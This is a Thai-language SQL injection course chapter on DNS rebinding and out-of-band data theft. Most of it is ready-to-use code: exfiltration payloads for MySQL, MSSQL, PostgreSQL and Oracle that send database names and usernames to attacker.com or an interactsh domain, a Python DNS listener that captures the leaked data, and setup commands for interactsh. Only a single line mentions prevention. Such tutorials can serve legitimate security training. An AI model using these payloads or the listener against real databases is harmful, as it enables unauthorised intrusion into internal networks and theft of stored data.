# Part 055: SQL Injection ผ่าน DNS Rebinding

## ภาพรวม

DNS Rebinding ใช้เพื่อเข้าถึง internal APIs และ databases ด้วย Out-of-Band injection

**ขั้นตอนที่ 896-910**

---

## 896. DNS Rebinding คืออะไร

```
DNS Rebinding attack flow:

1. Attacker ตั้งค่า DNS: attacker.com -> attacker_ip (A record)
2. Victim browser visits attacker.com
3. JS code loaded จาก attacker.com
4. Attacker เปลี่ยน DNS: attacker.com -> 192.168.1.1 (internal)
5. Browser ยังถือว่า same-origin (attacker.com)
6. JS fetch ไปยัง attacker.com (= internal 192.168.1.1)
7. สามารถ interact กับ internal services

ใช้กับ SQL injection เมื่อ:
- Internal DB admin UI (phpMyAdmin, Adminer)
- Web app ที่รัน localhost
- Docker internal networks
```

---

## 897. OOB SQL Injection + DNS

```sql
-- MySQL OOB via DNS LOAD_FILE() + UNC path
-- (ทำงานบน Windows MySQL)
SELECT LOAD_FILE(CONCAT('\\\\',
    (SELECT HEX(database())),
    '.attacker.com\\share'));

-- MSSQL OOB via xp_dirtree
DECLARE @data VARCHAR(1024);
SET @data = (SELECT TOP 1 username FROM users);
EXEC master..xp_dirtree 
    '\\' + @data + '.attacker.com\share';

-- PostgreSQL OOB via dblink
SELECT dblink_connect(
    'host=' || (SELECT current_database()) || '.attacker.com'
);

-- Oracle OOB via UTL_HTTP
SELECT UTL_HTTP.REQUEST(
    'http://attacker.com/?data=' || (SELECT user FROM dual)
) FROM dual;
```

---

## 898. OOB DNS Listener (Python)

```python
import socket
import threading
from datetime import datetime

class DNSListener:
    """Simple DNS listener สำหรับ OOB SQL injection"""
    
    def __init__(self, host='0.0.0.0', port=53):
        self.host = host
        self.port = port
        self.captured = []
    
    def parse_dns_query(self, data: bytes) -> str:
        """Extract domain name from DNS query"""
        try:
            # Skip transaction ID and flags (4 bytes)
            # Skip question count etc (8 bytes total header)
            idx = 12
            labels = []
            while idx < len(data) and data[idx] != 0:
                length = data[idx]
                idx += 1
                labels.append(data[idx:idx+length].decode('utf-8', errors='replace'))
                idx += length
            return '.'.join(labels)
        except Exception:
            return ''
    
    def handle_query(self, data: bytes, addr: tuple):
        domain = self.parse_dns_query(data)
        if domain:
            captured = {
                'timestamp': datetime.utcnow().isoformat(),
                'from': addr[0],
                'domain': domain,
            }
            self.captured.append(captured)
            print(f"[DNS] {addr[0]} -> {domain}")
        
        # Send minimal DNS response
        # (Transaction ID + flags + answer)
        response = data[:2] + b'\x81\x80' + data[4:6] + data[4:6]
        response += b'\x00\x00\x00\x00' + data[12:]
        # Add answer record
        response += b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
        response += socket.inet_aton('127.0.0.1')  # dummy response
        return response
    
    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.host, self.port))
        print(f"[*] DNS listener on {self.host}:{self.port}")
        
        while True:
            try:
                data, addr = sock.recvfrom(512)
                response = self.handle_query(data, addr)
                sock.sendto(response, addr)
            except KeyboardInterrupt:
                break
            except Exception as e:
                pass

# Usage (ต้องรันเป็น root สำหรับ port 53)
# listener = DNSListener()
# threading.Thread(target=listener.start, daemon=True).start()
```

---

## 899. interactsh OOB Platform

```bash
# interactsh คือ open-source alternative ของ Burp Collaborator

# ติดตั้ง:
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# เริ่ม client:
interactsh-client
# Output: Use xxxx.oast.live as your interactsh domain

# เอา domain ไปใช้ OOB:
# MySQL:
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT hex(database())), '.xxxx.oast.live\\a'));
# MSSQL:
EXEC master..xp_dirtree '\\'.+(SELECT TOP 1 name FROM sys.databases)+'.xxxx.oast.live\\a'
```

---

## สรุป

DNS Rebinding + OOB:
- **DNS Rebinding** - เปลี่ยน DNS record เพื่อเข้า internal
- **OOB DNS** - MySQL LOAD_FILE UNC, MSSQL xp_dirtree
- **OOB HTTP** - Oracle UTL_HTTP, PostgreSQL COPY TO PROGRAM
- **interactsh** - open-source OOB platform
- **Prevention** - block outbound DNS/HTTP จาก DB server

---

*Part 055 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
